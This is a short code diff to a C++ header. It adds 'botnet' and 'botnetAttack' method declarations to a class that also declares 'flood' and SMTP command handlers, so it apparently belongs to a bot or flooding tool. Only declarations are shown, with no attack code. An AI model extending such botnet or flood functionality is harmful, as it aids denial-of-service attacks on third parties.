@@ -34,6 +34,8 @@ private:
     void flood(std::istringstream &iss, std::vector<std::string> &args);
     void smtpCommand(const std::vector<std::string>& args);
     void systemstatus(std::istringstream &iss, std::vector<std::string> &args);
+    void botnet(std::istringstream &iss, std::vector<std::string> &args);
+    void botnetAttack();
 };
 
 #endif
